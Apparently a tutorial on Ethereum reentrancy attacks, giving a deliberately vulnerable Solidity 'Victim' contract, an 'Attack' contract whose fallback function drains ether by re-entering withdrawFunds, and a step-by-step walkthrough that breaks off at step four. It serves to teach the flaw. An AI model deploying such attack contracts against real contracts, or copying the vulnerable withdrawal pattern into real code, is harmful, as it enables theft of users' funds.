# Reentrancy Attack

## The Attack

Smart contracts, written in _Solidity_ for the _Ethereum Virtual Machine (EVM)_, are able to make external calls to either _Externally Owned Accounts (EOAs)_ or other smart contracts.

When a _reentrancy attack_ occurs, an attacker abuses an external call made by the victim smart contract to execute a [fallback function](https://solidity.readthedocs.io/en/v0.5.3/contracts.html#fallback-function) within the attacking smart contract that then performs an additional external call back into the victim smart contract, hence the term _reentrancy_.

This presents a problem when the victim smart contract's external call is executed **before** some mission critical logic takes place to maintain expected state and behavior of the victim smart contract.

For example, the following code represents two smart contracts, one named `Victim` and the other, `Attack`:

### Victim

```solidity
contract Victim {
    mapping(address => uint256) public balances;

    function depositFunds() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawFunds(uint256 _weiToWithdraw) public {
        require(balances[msg.sender] >= _weiToWithdraw);

        // This is where the external call is happening,
        // and where the vulnerability lies
        require(msg.sender.call.value(_weiToWithdraw)());

        // For this contract, this is the mission critical logic
        // that's taking place AFTER the external call.
        // Here we are maintaining the appropriate state
        // for this contract by deducting what msg.sender
        // has withdrawn from their balance,
        // but only AFTER we've sent ether to msg.sender
        balances[msg.sender] -= _weiToWithdraw;
    }
}
```

### Attack

```solidity
import "Victim.sol";

contract Attack {
    Victim public victim;

    constructor(address _victimAddress) {
        // Initialize the victim variable with the
        // Victim smart contract address
        victim = Victim(_victimAddress);
    }

    function attackVictim() public payable {
        victim.depositFunds.value(msg.value)();
        victim.withdrawFunds(msg.value);
    }

    function collectEther() public {
        msg.sender.transfer(this.balance);
    }

    // This is the fallback function that is executed
    // when the Victim smart contract makes it's
    // external call to this contract
    function () payable {
        if (victim.balance > 1 ether) {
            victim.withdrawFunds(1 ether);
        }
    }
}
```

If you haven't seen the vulnerability yet, follow the steps below to get a step-by-step picture of how the attack would play out:

**NOTE** This example is assuming other users have deposited ether into the `Victim` contract

1. The `Victim` contracts is deployed
2. The attacker gets the address of the deployed `Victim` contract, and deploys the `Attack` contract passing the `Victim` contract's address to `Attack`'s `constructor`
3. The attacker would call the `attackVictim` function with some amount of ether and provide _a lot_ of `gas` for the transaction
    - The amount `gas` that is sent with the transaction, is important because if not enough `gas` is sent, the transaction could _revert_ before all the funds were withdrawn causing the attacker's would-be ether to remain in the `Victim` contract
4. 
